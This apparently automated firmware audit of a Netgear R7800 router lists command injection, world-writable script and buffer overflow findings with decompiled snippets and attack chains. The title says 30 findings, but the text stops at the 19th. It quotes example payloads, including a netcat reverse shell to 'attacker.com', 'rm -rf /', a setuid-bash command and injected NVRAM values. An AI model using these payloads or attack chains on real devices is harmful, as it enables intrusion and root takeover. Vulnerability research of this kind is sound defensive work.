# R7800 (30 findings)

---

### FilePermission-wifi

- **File/Directory Path:** `sbin/wifi`
- **Location:** `sbin/wifi (File Permission)`
- **Risk Score:** 9.0
- **Confidence:** 9.0
- **Description:** The file '/sbin/wifi' has global read, write, and execute permissions (-rwxrwxrwx), allowing any user (including non-root users) to modify the script content. An attacker can insert malicious code (such as a reverse shell or command execution), which, when the script is executed by a privileged user (such as root) (e.g., through system management tasks or network configuration operations), will lead to privilege escalation. Trigger condition: After the attacker modifies the script, they wait for or trigger script execution (e.g., via the 'wifi' command). Exploitation method: Directly edit the script to insert a malicious payload. This is a complete and verifiable attack chain: non-root user modifies the file → script is executed by root → privilege escalation.
- **Code Snippet:**
  ```
  File permissions: -rwxrwxrwx
  Example script content (can be modified):
  #!/bin/sh
  # Malicious code example: If an attacker inserts 'rm -rf /' or 'nc -e /bin/sh attacker.com 4444'
  ...
  ```
- **Keywords:** /sbin/wifi
- **Notes:** Need to verify if the script is executed in a privileged context (e.g., called by root). It is recommended to check how system processes or services call this script. Subsequent analysis can examine components that call this script (such as init scripts or web interfaces). The attacker is a non-root user already connected to the device and possessing valid login credentials, meeting the core requirements.

---
### Command-Injection-net-wan

- **File/Directory Path:** `etc/init.d/net-wan`
- **Location:** `net-wan:setup_interface_dhcp (udhcpc command), net-wan:setup_interface_static_ip (ifconfig command)`
- **Risk Score:** 9.0
- **Confidence:** 9.0
- **Description:** A command injection vulnerability exists in multiple functions where configuration values (such as `wan_hostname`, `wan_ipaddr`) are retrieved from NVRAM via `$CONFIG get` and directly inserted into shell commands without being quoted. An attacker can inject arbitrary commands by setting malicious configuration values (such as strings containing semicolons or command separators). Trigger conditions include: when the WAN interface starts (e.g., system boot, network restart, or manual script execution), the script runs with root privileges. Exploitation method: an attacker modifies the NVRAM configuration (e.g., via the web management interface), sets `wan_proto` to 'dhcp' or 'static', and sets corresponding malicious values (e.g., `wan_hostname` to 'test; id > /tmp/exploit'), then triggers script execution. This results in commands being executed in the root context, achieving privilege escalation.
- **Code Snippet:**
  ```
  In the setup_interface_dhcp function:
  udhcpc -b -i $WAN_IF -h $u_hostname -r $($CONFIG get wan_dhcp_ipaddr) -N $($CONFIG get wan_dhcp_oldip) ${u_wan_domain:+-d $u_wan_domain}
  where $u_hostname comes from $($CONFIG get wan_hostname) or $($CONFIG get Device_name), unquoted.
  In the setup_interface_static_ip function:
  ifconfig $WAN_IF $($CONFIG get wan_ipaddr) netmask $($CONFIG get wan_netmask)
  where $($CONFIG get wan_ipaddr) and $($CONFIG get wan_netmask) are unquoted.
  ```
- **Keywords:** wan_hostname, wan_ipaddr, wan_netmask, wan_gateway, wan_proto, Device_name
- **Notes:** The attack chain is complete and verifiable: attacker controls NVRAM configuration -> triggers script execution -> command injection executed with root privileges. It is recommended to check if all variables using `$CONFIG get` are properly quoted in commands. Subsequent analysis can examine other related scripts (such as firewall.sh, ppp.sh) to look for similar vulnerabilities.

---
### Untitled Finding

- **File/Directory Path:** `bin/fbwifi`
- **Location:** `fbwifi:0x000177bc fcn.000177bc`
- **Risk Score:** 9.0
- **Confidence:** 9.0
- **Description:** The function fcn.000177bc contains multiple system() calls that execute commands built from user-controlled input without proper sanitization. The commands involve 'fbwifi_nvram set' and 'fbwifi_nvram commit', which are used to manage NVRAM variables. User input from the parameter param_1 is incorporated into the command string using helper functions (e.g., fcn.00017528, fcn.0007aeac), and the resulting string is passed directly to system(). An attacker can inject arbitrary commands by including shell metacharacters (e.g., ';', '|', '&') in the input, leading to remote code execution. The vulnerability is triggered when the function processes untrusted input, such as from network requests or IPC mechanisms, and executes the constructed commands with root privileges if the binary has elevated permissions.
- **Code Snippet:**
  ```
  void fcn.000177bc(uchar *param_1) {
      // ... function setup ...
      fcn.0000fae4(iVar2 + -0x28, *0x17988, *0x1798c);  // Build string with 'fbwifi_nvram set '
      fcn.0000fb50(iVar2 + -0x24, iVar2 + -0x28, *0x17990);  // Add '=' separator
      fcn.00017528(iVar2 + -0x20, *param_1);  // Incorporate user input
      fcn.0000fb80(iVar2 + -0x2c, iVar2 + -0x24, iVar2 + -0x20);  // Combine strings
      sym.imp.system(*(iVar2 + -0x2c));  // Execute command
      // ... similar patterns for other system calls ...
      sym.imp.system(*0x1799c);  // Execute 'fbwifi_nvram commit'
  }
  ```
- **Keywords:** fbwifi_nvram, param_1 (user input structure)
- **Notes:** The vulnerability is highly exploitable due to the use of system() with unsanitized user input. Attackers with network access or IPC capabilities can trigger this vulnerability. Further analysis should verify the source of param_1 and explore other functions using system() (e.g., fcn.00017d1c, fcn.00017d98) for similar issues. The binary may run with elevated privileges, increasing the impact.

---
### PrivEsc-firewall_script

- **File/Directory Path:** `etc/scripts/firewall.sh`
- **Location:** `firewall.sh: in functions firewall_start and firewall_stop, specifically the lines executing 'ls ${LIBDIR}/*.rule' and '$SHELL $rule start/stop'`
- **Risk Score:** 9.0
- **Confidence:** 9.0
- **Description:** The 'firewall.sh' script contains a vulnerability that allows privilege escalation from a non-root user to root via arbitrary code execution. The script executes all .rule files in the /etc/scripts/firewall directory with parameters 'start' or 'stop' when 'net-wall start/stop' is called. The directory is world-writable (permissions 777), enabling any user to add or modify .rule files. When 'net-wall' is triggered (likely with root privileges for iptables management), these files are executed as root. An attacker can plant a malicious .rule file containing commands like 'chmod +s /bin/bash' or similar to gain root shell access. The trigger condition is the execution of 'net-wall start/stop', which may occur during system startup, restart, or via user-invoked commands. The vulnerability is exploitable due to the lack of access controls on the directory and the script's blind execution of files.
- **Code Snippet:**
  ```
  From firewall.sh:
  firewall_start() {
      # start extra firewall rules
      ls ${LIBDIR}/*.rule | while read rule
      do
          $SHELL $rule start
      done
  }
  
  firewall_stop() {
      # stop extra firewall rules
      ls ${LIBDIR}/*.rule | while read rule
      do
          $SHELL $rule stop
      done
  }
  
  Directory permissions from 'ls -la firewall/':
  drwxrwxrwx 1 user user 0 Jun  22  2017 .
  -rwxrwxrwx 1 user user 889 Jun  22  2017 ntgr_sw_api.rule
  ```
- **Keywords:** file_path:/etc/scripts/firewall/, file_path:/etc/scripts/firewall.sh, file_pattern:*.rule in /etc/scripts/firewall/, command:config get, environment_variable:CONFIG, NVRAM_variable:ntgr_api_firewall*
- **Notes:** The attack chain is complete: non-root user writes malicious .rule file -> triggers net-wall start/stop (e.g., via system service or user command) -> code executes as root. Further validation could involve checking if 'net-wall' is accessible or triggerable by the user, and examining other .rule files or scripts in /etc/scripts/firewall for additional vulnerabilities. The world-writable directory is a critical misconfiguration that amplifies the risk.

---
### PrivEsc-jiggle_firewall

- **File/Directory Path:** `usr/local/bin/jiggle_firewall`
- **Location:** `usr/local/bin/jiggle_firewall:1 (entire file)`
- **Risk Score:** 9.0
- **Confidence:** 9.0
- **Description:** The file 'jiggle_firewall' has global read, write, and execute permissions (-rwxrwxrwx), allowing any user to modify the script's content. The script calls 'fw restart' and iptables commands, which typically require root privileges, indicating the script may be executed as root. An attacker can modify the script to inject malicious commands (such as a reverse shell or setuid shell); when the script is triggered by the system (e.g., firewall status check), the malicious code will run with root privileges. Trigger condition: The attacker possesses valid login credentials (non-root) and can write to this file; the script needs to be executed with root privileges (assumed to be called by a system service). Exploitation method: Directly modify the script content and wait for execution.
- **Code Snippet:**
  ```
  #!/bin/sh
  
  LOGGER="logger -t jiggle_firewall -p daemon.notice"
  $LOGGER Checking firewall state...
  for i in 1 2 3 4 5 6 7 8 9 10; do
  	iptables -L forward | grep zone_lan_forward >/dev/null && break
  	$LOGGER Jiggling firewall - attempt $i
  	fw restart
  	sleep 1
  done
  
  iptables -L forward | grep zone_lan_forward >/dev/null || $LOGGER Firewall is still broken && $LOGGER Firewall looks ok
  ```
- **Keywords:** usr/local/bin/jiggle_firewall, fw restart
- **Notes:** The attack chain is complete and verifiable: file permissions allow modification, and the script may execute as root. It is recommended to verify the execution context (e.g., via cron or system services) and the path of the 'fw' command. Other files (such as 'apply_appflow', 'reset_wan') may have similar permission issues and require further analysis.

---
### Untitled Finding

- **File/Directory Path:** `lib/wifi/mac80211.sh`
- **Location:** `mac80211.sh:enable_mac80211 function (specific line numbers not provided, but visible in the code snippet)`
- **Risk Score:** 8.5
- **Confidence:** 9.0
- **Description:** In the `enable_mac80211` function of 'mac80211.sh', a command injection vulnerability was discovered. Specifically, when calling the `iw` command to set the channel and adhoc mode, the variables `$htmode`, `$freq`, `$bssid`, `$beacon_int`, `$brstr`, `$mcval`, and `$keyspec` are not quoted, allowing an attacker to inject arbitrary shell commands by controlling these variables. The trigger conditions include: an attacker modifying the wireless configuration (such as `htmode` or `bssid`) to a malicious string (for example, containing semicolons or command separators), and then triggering a wireless reload (such as via `/etc/init.d/network reload`). Exploitation method: the injected commands will be executed with root privileges, enabling privilege escalation or system control. This vulnerability affects AP and adhoc modes, and because the script runs as root during the wireless management process, the attack chain is complete and feasible.
- **Code Snippet:**
  ```
  In the enable_mac80211 function:
  [ -n "$fixed" -a -n "$channel" ] && iw dev "$ifname" set channel "$channel" $htmode
  
  In the adhoc mode setup:
  iw dev "$ifname" ibss join "$ssid" $freq $htmode \
      ${fixed:+fixed-freq} $bssid \
      ${beacon_int:+beacon-interval $beacon_int} \
      ${brstr:+basic-rates $brstr} \
      ${mcval:+mcast-rate $mcval} \
      ${keyspec:+keys $keyspec}
  ```
- **Keywords:** htmode, bssid, beacon_int, basic_rate_list, mcast_rate, keyspec, /etc/config/wireless
- **Notes:** Attack chain is complete: an attacker (non-root user but with login credentials) can inject commands by modifying the wireless configuration, and the script executes with root privileges. Need to verify the permissions for modifying wireless configuration (for example, via web interface or uci command). It is recommended to check for other similar unquoted command calls. Subsequent analysis can examine other scripts or binaries to look for similar vulnerabilities.

---
### command-injection-wps-supplicant-update-uci

- **File/Directory Path:** `lib/wifi/wps-supplicant-update-uci`
- **Location:** `wps-supplicant-update-uci:22,58,59,60,69,76,83,93,98`
- **Risk Score:** 8.5
- **Confidence:** 9.0
- **Description:** In the 'wps-supplicant-update-uci' script, multiple commands use unquoted variables (such as IFNAME, parent, IFNAME_AP), leading to command injection vulnerabilities. An attacker (non-root user with valid login credentials) can trigger WPS events (such as CONNECTED) and control the IFNAME parameter to inject malicious shell metacharacters (such as semicolons, backticks), thereby executing arbitrary commands. The script runs with root privileges (using 'uci set' and 'uci commit' to modify system configuration), and successful exploitation can lead to privilege escalation. Complete attack chain: input point (WPS event interface) → data flow (unvalidated IFNAME parameter directly used in commands) → dangerous operation (command injection executing root privilege code).
- **Code Snippet:**
  ```
  Line 22: local parent=$(cat /sys/class/net/${IFNAME}/parent)
  Line 58: wpa_cli -i$IFNAME -p/var/run/wpa_supplicant-$IFNAME save_config
  Line 59: ssid=$(wpa_cli -i$IFNAME -p/var/run/wpa_supplicant-$IFNAME status | grep ^ssid= | cut -f2- -d =)
  Line 60: wpa_version=$(wpa_cli -i$IFNAME -p/var/run/wpa_supplicant-$IFNAME status | grep ^key_mgmt= | cut -f2- -d=)
  Line 69: hostapd_cli -i$IFNAME_AP -p/var/run/hostapd-$parent wps_config $ssid WPA2PSK CCMP $psk
  Line 76: hostapd_cli -i$IFNAME_AP -p/var/run/hostapd-$parent wps_config $ssid WPAPSK TKIP $psk
  Line 83: hostapd_cli -i$IFNAME_AP -p/var/run/hostapd-$parent wps_config $ssid OPEN NONE
  Line 93: kill "$(cat "/var/run/wps-hotplug-$IFNAME.pid")"
  Line 98: kill "$(cat "/var/run/wps-hotplug-$IFNAME.pid")"
  ```
- **Keywords:** IFNAME, CMD, /var/run/wpa_supplicant-$IFNAME.conf, /var/run/wifi-wps-enhc-extn.conf, /var/run/hostapd-$parent, /var/run/wps-hotplug-$IFNAME.pid
- **Notes:** The attacker needs to be able to trigger WPS events and control the IFNAME parameter, which may be achieved through local system calls or network requests. The script running with root privileges is inferred but requires further verification of the runtime context. It is recommended to check the script's caller and file permissions. Related functions: is_section_ifname, get_psk, wps_pbc_enhc_get_ap_overwrite. Subsequent analysis should focus on how to control the IFNAME parameter and verify script execution privileges.

---
### Untitled Finding

- **File/Directory Path:** `usr/lib/pppd/2.4.3/dni-l2tp.so`
- **Location:** `dni-l2tp.so:0x19b4 (fcn.000017d0)`
- **Risk Score:** 8.5
- **Confidence:** 9.0
- **Description:** A buffer overflow vulnerability exists in the function that processes static route rules from '/tmp/ru_static_route'. The function uses strcpy to copy tokens from the file into a stack-based buffer without bounds checking. Specifically, when reading lines via fgets (up to 128 bytes) and parsing with strtok, the strcpy operations at offsets +8, +0x2c, +0x4c, +0x6c, and +0x94 within entry structures can overflow the buffer. The stack buffer is 10176 bytes (0x27c0), and the saved return address (LR) is located at an offset of 0x27e0 from the buffer start. By crafting a file with a token longer than 76 bytes in a field copied to offset +0x94 of the last entry (at buffer offset 0x2794), an attacker can overwrite the return address. This allows control of program execution when the function returns, potentially leading to arbitrary code execution. The L2TP service likely runs as root, enabling privilege escalation.
- **Code Snippet:**
  ```
  0x000019b4      cafdffeb       bl sym.imp.strcpy           ; char *strcpy(char *dest, const char *src)
  ; Preceding code: add r0, r2, sl; add r0, r0, 0x94; mov r1, r3
  ; Where dest is at offset +0x94 from entry base, and src is from strtok parsing.
  ```
- **Keywords:** /tmp/ru_static_route, fcn.000017d0
- **Notes:** The function fcn.000017d0 is called by fcn.00001c38, which may be an entry point from L2TP connection setup. Assumes the L2TP service is active and reads '/tmp/ru_static_route'. Further analysis should verify the service context and exploitability under ASLR. Other strcpy calls in the function (e.g., at 0x1930, 0x1954) may also be exploitable but require different overflow calculations.

---
### Untitled Finding

- **File/Directory Path:** `www/cgi-bin/RMT_invite.cgi`
- **Location:** `RMT_invite.cgi (Specific locations include eval statements and multiple ${nvram} set commands)`
- **Risk Score:** 8.5
- **Confidence:** 8.0
- **Description:** The CGI script 'RMT_invite.cgi' directly uses user-controlled FORM variables (such as FORM_TXT_remote_passwd, FORM_TXT_remote_login) in shell commands at multiple locations without proper input validation or escaping. This allows an attacker to execute arbitrary commands by injecting shell metacharacters (such as quotes, semicolons, or backticks). Trigger conditions include when the script processes user registration or deregistration requests and the attacker sends malicious FORM data. For example, in an NVRAM setting command, if the variable value contains '; malicious_command ;', it will interrupt the original command and execute the malicious command. Potential exploitation methods include injecting commands via HTTP requests to gain shell access or modify system configuration.
- **Code Snippet:**
  ```
  eval "\`/www/cgi-bin/proccgi $*\`"
  ${nvram} set readycloud_user_password="$FORM_TXT_remote_passwd"
  echo "{\"state\":\"1\",\"owner\":\"$FORM_TXT_remote_login\",\"password\":\"$FORM_TXT_remote_passwd\"}"|REQUEST_METHOD=PUT PATH_INFO=/api/services/readycloud /www/cgi-bin/readycloud_control.cgi
  ```
- **Keywords:** FORM_TXT_remote_passwd, FORM_TXT_remote_login, FORM_submit_flag, nvram
- **Notes:** This vulnerability is based on direct evidence from the script code; the attacker requires valid login credentials to access the CGI script. It is recommended to further analyze the 'proccgi' binary and 'readycloud_control.cgi' to confirm the full attack chain and potential impact. The current analysis is limited to 'RMT_invite.cgi', but a clear exploitation path has been identified.

---
### command-injection-hostapd_setup_vif

- **File/Directory Path:** `lib/wifi/hostapd.sh`
- **Location:** `hostapd.sh:hostapd_setup_vif function (roughly at the end of the script)`
- **Risk Score:** 8.5
- **Confidence:** 8.0
- **Description:** A command injection vulnerability was discovered in the 'hostapd.sh' script. This vulnerability originates from the `hostapd_setup_vif` function, where user-controllable variables `ifname` and `device` are not quoted or escaped when used in shell commands. Specifically, when the script generates and executes hostapd and hostapd_cli commands, these variables are directly embedded into the command line strings. If an attacker can modify the wireless configuration (for example, through the Web interface or UCI commands), setting `ifname` or `device` to malicious values containing shell metacharacters (such as semicolons, backticks), arbitrary commands can be executed when the script runs with root privileges. Trigger conditions include: the attacker possesses valid login credentials (non-root user), can modify the wireless configuration (such as `/etc/config/wireless`), and triggers hostapd reconfiguration (for example, by restarting the network or applying settings). Exploitation method: the attacker sets `ifname` to a value like 'abc; touch /tmp/pwned'; when the script executes, it will parse and execute the injected command, achieving privilege escalation.
- **Code Snippet:**
  ```
  hostapd -P /var/run/wifi-$ifname.pid -B /var/run/hostapd-$ifname.conf -e $entropy_file
  
  if [ -n "$wps_possible" -a -n "$config_methods" ]; then
      pid=/var/run/hostapd_cli-$ifname.pid
      hostapd_cli -i $ifname -P $pid -a /lib/wifi/wps-hostapd-update-uci -p /var/run/hostapd-$device -B
  fi
  ```
- **Keywords:** ifname, device, /etc/config/wireless, /var/run/hostapd-$ifname.conf, /var/run/wifi-$ifname.pid
- **Notes:** This vulnerability requires the attacker to be able to modify the wireless configuration, which might be possible through the Web interface or CLI. It is recommended to validate and escape input variables, or use quotes in commands. Subsequent analysis could check if other configuration variables (such as `phy`, `bridge`) have similar issues, and verify if hostapd's own handling of configuration files has additional vulnerabilities.

---
### BufferOverflow-cgi-fcgi-command-line

- **File/Directory Path:** `usr/bin/cgi-fcgi`
- **Location:** `bin/cgi-fcgi:0x92ec (function fcn.00009148)`
- **Risk Score:** 8.5
- **Confidence:** 8.0
- **Description:** A stack-based buffer overflow vulnerability exists in the handling of command-line arguments for the -connect and -bind options. The function fcn.00009148 uses strcpy to copy user-supplied arguments into fixed-size stack buffers without any bounds checking. An attacker can provide a long string as the argument to -connect or -bind, overflowing the destination buffer and overwriting adjacent stack data, including the return address. This can lead to arbitrary code execution. The trigger condition is when the binary is invoked with -connect or -bind followed by a maliciously long string. Constraints include the buffer size being small (e.g., likely 4-36 bytes based on stack variables), and the attack requires the ability to control command-line arguments, which is feasible for a non-root user via CGI requests or direct execution.
- **Code Snippet:**
  ```
  From decompilation at 0x92ec in fcn.00009148:
    puVar12 = *(param_2 + iVar7 * 4);  // puVar12 is from argv
    if (*puVar12 != 0x2d) {
        pcVar3 = *(iVar15 + 0x2c);     // pcVar3 points to a stack buffer
        if (*pcVar3 == '\0') {
    code_r0x000092ec:
            sym.imp.strcpy(pcVar3, puVar12);  // No bounds check
        }
    }
    Additionally, for -connect:
    iVar2 = sym.imp.strcmp(puVar12, *(iVar15 + -0x1044));
    if (iVar2 != 0) {
        iVar7 = iVar7 + 1;
        if (iVar7 == param_1) { ... }
        puVar12 = *(param_2 + iVar7 * 4);
        pcVar3 = *(iVar15 + 0x28);      // Similar for -connect
        goto code_r0x000092ec;
    }
  ```
- **Keywords:** Command-line arguments (-connect, -bind), environment variable (CONTENT_LENGTH via getenv, though not directly exploited here)
- **Notes:** This vulnerability is directly exploitable by a non-root user with login credentials, as they can invoke cgi-fcgi with malicious arguments. The binary may be used in web server CGI contexts, allowing remote exploitation via crafted HTTP requests. Further analysis could involve determining exact buffer sizes and offsets for reliable exploitation, but the vulnerability is confirmed. No other critical vulnerabilities were found in this file during this analysis.

---
### BufferOverflow-uam_checkuser

- **File/Directory Path:** `usr/lib/uams/uams_randnum.so`
- **Location:** `uams_randnum.so:0x00000dfc fcn.00000dfc`
- **Risk Score:** 8.5
- **Confidence:** 8.0
- **Description:** A stack buffer overflow vulnerability was discovered in the authentication function of 'uams_randnum.so'. The function fcn.00000dfc uses the unsafe string functions strcpy and strcat to process the input parameter param_2 (possibly a username or file path), copying data into a fixed-size stack buffer (0x1001 bytes). When the length of param_2 exceeds 0x1000 bytes, strcpy causes a buffer overflow, overwriting saved registers and the return address on the stack. Trigger condition: An attacker provides an input string with a length > 4096 bytes (e.g., via an authentication request). Exploitation method: Crafting a long string to overwrite the return address and control the program execution flow, potentially enabling arbitrary code execution on the ARM architecture. The vulnerability exists within the authentication logic; an attacker as a logged-in user (non-root) could potentially trigger it via network protocols (such as AFP) or local authentication.
- **Code Snippet:**
  ```
  // Key code snippet showing the vulnerability
  sym.imp.strcpy(puVar11, param_2); // Directly copies input to stack buffer, no length check
  // ...
  if (bVar22 || bVar21 != bVar23) {
      sym.imp.strcat(puVar11, *0x1670 + 0x14c8); // Appends a string, potentially exacerbating the overflow
  }
  // Buffer definition and size: puVar11 is a stack buffer, size 0x1001 bytes
  // The check logic only rejects inputs with length < 0x1000, but allows inputs with length >= 0x1000 to execute strcpy
  ```
- **Keywords:** param_2, uams_randnum, uam_checkuser
- **Notes:** The vulnerability requires further validation of the actual trigger path, for example, confirming the param_2 input source through debugging. It is recommended to analyze components calling this function (such as afpd) to complete the attack chain. Other functions (such as fcn.00001694) might contain additional vulnerabilities, but the current focus has identified a high-risk issue.

---
### BufferOverflow-UDP-datalib

- **File/Directory Path:** `bin/datalib`
- **Location:** `datalib:0x90e4 fcn.000090e4`
- **Risk Score:** 8.5
- **Confidence:** 7.5
- **Description:** In the 'datalib' program, a complete attack chain based on buffer overflow was discovered. Attackers can send data packets of type '\x01' via a local UDP socket (127.0.0.1:2313), containing malicious input in the format 'key=value'. When the program processes this input in function fcn.000090e4, it uses strcpy to copy the key and value to a global memory buffer without performing length checks or boundary validation. If the key or value is too long, it causes a buffer overflow, overwriting adjacent memory structures such as function pointers or global variables, potentially enabling arbitrary code execution. The program runs as a daemon (via daemon call) and may execute with root privileges, allowing an attacker to gain full system control. Trigger condition: The attacker sends a UDP packet to 127.0.0.1:2313, where the first byte of the data is '\x01', followed by a long key or long value (e.g., over 1000 bytes). Exploitation method: By crafting a specific overflow payload, overwrite control flow data in memory to execute shellcode or jump to malicious code.
- **Code Snippet:**
  ```
  // Key copy in fcn.000090e4
  sym.imp.strcpy(puVar5 + 3, param_1);
  // Value copy in fcn.000090e4
  sym.imp.strcpy(iVar7, param_2);
  // Input processing in fcn.00008884
  if (cVar9 == '\x01') {
      iVar2 = sym.imp.strchr(iVar10, 0x3d);
      puVar11 = iVar2 + 0;
      if (puVar11 != NULL) {
          *puVar11 = 0;
          iVar2 = fcn.000090e4(iVar10, puVar11 + 1);
      }
  }
  ```
- **Keywords:** socket_path: 127.0.0.1:2313, NVRAM/ENV variables: Set via key-value pairs, may affect global configuration, Global memory pool: *0x9248 + 0x9558
- **Notes:** Vulnerability exploitation depends on the global memory layout and control of the overflow target. It is recommended to further analyze the global memory structure to refine the exploit payload. Related functions: fcn.00008884 (main loop), fcn.00008f9c (hash lookup). Next steps: Verify program execution privileges (whether root), test actual overflow effects, explore potential vulnerabilities in other input types (such as '\x05' or '\t').

---
### CommandInjection-fcn.0000e5e0

- **File/Directory Path:** `usr/sbin/net-cgi`
- **Location:** `net-cgi:0xee18 fcn.0000e5e0`
- **Risk Score:** 8.5
- **Confidence:** 7.5
- **Description:** A command injection vulnerability was discovered in function `fcn.0000e5e0`. This function processes CGI requests and reads user input from environment variables (such as 'HTTP_ACCEPT_LANGUAGE', 'HTTP_HOST', 'HTTP_USER_AGENT'). This input is used to construct command line strings and is executed via the `system` function. Specifically, at address 0xee18, `sprintf` is used to build a command string (such as 'smartctl -x /dev/%s > %s'), where user input is directly inserted. Due to a lack of input validation and escaping, an attacker can inject malicious commands by manipulating HTTP request headers or parameters (for example, using semicolons or backticks to separate commands). Trigger conditions include sending malicious CGI requests to endpoints such as 'func.cgi' or 'apply.cgi'. Exploiting this vulnerability, an attacker can execute arbitrary commands with non-root user privileges, potentially leading to privilege escalation or system control.
- **Code Snippet:**
  ```
  // Get user input from environment variables
  iVar5 = sym.imp.getenv(uVar6); // uVar6 could be 'HTTP_HOST', etc.
  if (iVar5 + 0 == 0) {
      sym.imp.strncpy(*0xf5e8, puVar26 + -0x8c, 0x100);
  } else {
      sym.imp.snprintf(*0xf5e8, 0x100, *0xf5e4, puVar26 + -0x8c);
  }
  // Build command string and execute
  sym.imp.sprintf(puVar26 + -0x4cc, *0xf69c, *0xf5e8); // *0xf69c could be 'smartctl -x /dev/%s > %s'
  sym.imp.system(puVar26 + -0x4cc);
  ```
- **Keywords:** SCRIPT_FILENAME, QUERY_STRING, REQUEST_METHOD, HTTP_ACCEPT_LANGUAGE, HTTP_HOST, HTTP_USER_AGENT
- **Notes:** Exploiting this vulnerability requires the attacker to have valid login credentials (non-root user) and be able to send HTTP requests to CGI endpoints. Static analysis shows user input is directly used for command execution, but dynamic testing was not performed to confirm exploitability. It is recommended to further validate the data flow of input points 'HTTP_HOST' and 'HTTP_USER_AGENT'. Related functions include `fcn.00019af0` and `fcn.0000e590`, which may involve additional input processing.

---
### BufferOverflow-fcn.0000929c

- **File/Directory Path:** `sbin/traffic_meter`
- **Location:** `traffic_meter: function fcn.0000929c (address 0x0000929c), strcpy call after config_get`
- **Risk Score:** 8.0
- **Confidence:** 8.0
- **Description:** The function fcn.0000929c in 'traffic_meter' contains a stack buffer overflow vulnerability when handling the 'time_zone' NVRAM variable. The code uses 'strcpy' to copy the value of 'time_zone' into a 64-byte stack buffer without bounds checking. An attacker with valid login credentials can set 'time_zone' to a string longer than 64 bytes via NVRAM or web interface, triggering the overflow. The overflow can overwrite local variables and the saved return address, located approximately 364 bytes from the buffer start, potentially leading to arbitrary code execution. The vulnerability is triggered when the program processes configuration data, which occurs during normal operation or via daemon execution. Exploitation requires the attacker to craft a payload that overwrites the return address with shellcode or ROP gadgets, assuming no stack protection mechanisms are in place.
- **Code Snippet:**
  ```
  From decompilation:
  sym.imp.memset(puVar23 + 0xfffffeb8, 0, 0x40); // Buffer of 64 bytes
  uVar4 = sym.imp.config_get(*0xa258); // Get 'time_zone' value
  sym.imp.strcpy(puVar23 + 0xfffffeb8, uVar4); // Unsafe copy
  ```
- **Keywords:** time_zone
- **Notes:** The distance to the saved return address is calculated based on stack layout from decompilation. Exploitability assumes no ASLR or NX protections. Further validation through dynamic analysis is recommended to confirm the exact offset and payload delivery. The 'time_zone' variable is accessible to non-root users with login credentials, making it a viable input point.

---
### Untitled Finding

- **File/Directory Path:** `etc/scripts/ntgr_sw_api/ntgr_sw_api.sh`
- **Location:** `ntgr_sw_api.sh:18 nvram get`
- **Risk Score:** 8.0
- **Confidence:** 8.0
- **Description:** In the nvram get function, parameters are directly passed to the config command without using double quotes for escaping, allowing command injection. An attacker can execute arbitrary commands by providing malicious parameters containing shell metacharacters (such as semicolons). For example, calling `./ntgr_sw_api.sh nvram get "; malicious_command"` will execute `config get` followed by `malicious_command`. The trigger condition is that the attacker can control the input parameters, and the script runs with sufficient privileges.
- **Code Snippet:**
  ```
  printf "$($CONFIG $@)";
  ```
- **Keywords:** NVRAM variables are controlled via parameters, command /bin/config
- **Notes:** Need to verify if the script runs with high privileges (e.g., root), and if the input points are exposed via network interfaces or IPC. It is recommended to check the components that call this script.

---
### Untitled Finding

- **File/Directory Path:** `etc/scripts/ntgr_sw_api/ntgr_sw_api.sh`
- **Location:** `ntgr_sw_api.sh:23 nvram unset|commit`
- **Risk Score:** 8.0
- **Confidence:** 8.0
- **Description:** In the nvram unset and commit functions, parameters are directly passed to the config command without using double quotes for escaping, allowing command injection. An attacker can execute arbitrary commands by providing malicious parameters containing shell metacharacters. For example, calling `./ntgr_sw_api.sh nvram unset "; malicious_command"` will execute `config unset` followed by `malicious_command`. The trigger condition is that the attacker can control the input parameters, and the script runs with sufficient privileges.
- **Code Snippet:**
  ```
  $CONFIG $@;
  ```
- **Keywords:** NVRAM variables are controlled via parameters, command /bin/config
- **Notes:** Need to verify if the script runs with high privileges and whether the input points are exposed. The unset and commit operations may affect system configuration, exacerbating the risk.

---
### command-injection-dhcp-router

- **File/Directory Path:** `usr/share/udhcpc/default.script.ap`
- **Location:** `default.script.ap: approximately lines 40-43 (for loop with route command)`
- **Risk Score:** 8.0
- **Confidence:** 8.0
- **Description:** The script contains a command injection vulnerability in the processing of the DHCP 'router' option. When the script executes for 'renew' or 'bound' events, it iterates over the $router variable (containing router IPs from DHCP) and runs the route command without sanitizing input. If an attacker provides a crafted router value with shell metacharacters (e.g., '1.2.3.4; malicious_command'), the shell interprets and executes the injected command. This occurs because the variable is not quoted, allowing word splitting and command substitution. The script likely runs with root privileges, enabling privilege escalation. Trigger conditions include a malicious DHCP response during lease renewal or acquisition.
- **Code Snippet:**
  ```
  for i in $router ; do
      $ECHO "adding router $i"
      $ROUTE add default gw $i dev $interface
  done
  ```
- **Keywords:** DHCP environment variable $router, /sbin/route, /bin/config, default.script.ap
- **Notes:** Exploitation requires the attacker to control the DHCP server or spoof DHCP responses, which may be feasible if the attacker is on the same network. The script is executed by udhcpc, which typically runs with root privileges. No evidence of input validation or sanitization was found in this file. Further analysis of the udhcpc binary, network configuration, and the /bin/config utility is recommended to assess full impact and additional attack vectors.

---
### BufferOverflow-fcn.0000bfb0

- **File/Directory Path:** `sbin/net-util`
- **Location:** `net-util:0xc000 fcn.0000bfb0`
- **Risk Score:** 7.5
- **Confidence:** 9.0
- **Description:** The vulnerability is a buffer overflow in the strcpy function call within fcn.0000bfb0. The function copies user-controlled input from argv[1] into a fixed-size stack buffer without any bounds checking. This can overwrite the return address and lead to arbitrary code execution. The trigger condition is when net-util is executed with exactly two arguments (argc=3, including the program name), and the first argument (argv[1]) is a long string that exceeds the buffer size. The buffer in fcn.0000bfb0 is approximately 16 bytes based on stack variable allocations, but the exact size may vary. An attacker can craft a malicious argument to exploit this, potentially executing shellcode or causing a crash. The function fcn.0000bfb0 is called by multiple functions (fcn.0000cc8c, fcn.0000d670, fcn.0000d9e4), all of which pass user input from command-line arguments, making the vulnerability accessible through various program execution paths.
- **Code Snippet:**
  ```
  // From fcn.0000bfb0
  sym.imp.strcpy(puVar6 + -7, param_1);
  
  // From fcn.0000cc8c (caller)
  fcn.0000bfb0(uVar8); // uVar8 is param_2[1] (argv[1])
  ```
- **Keywords:** argv[1]
- **Notes:** The binary net-util has permissions -rwxrwxrwx, indicating no setuid bit, so exploitation may not grant root privileges. However, it could be used for denial of service or other attacks within the user's context. Further analysis could involve testing the exact buffer size and exploitability under real conditions. The functions fcn.0000d670 and fcn.0000d9e4 should also be investigated for similar issues, but the chain via fcn.0000cc8c is already verified.

---
### Untitled Finding

- **File/Directory Path:** `usr/bin/lua`
- **Location:** `lua:0x00008d04 main`
- **Risk Score:** 7.5
- **Confidence:** 9.0
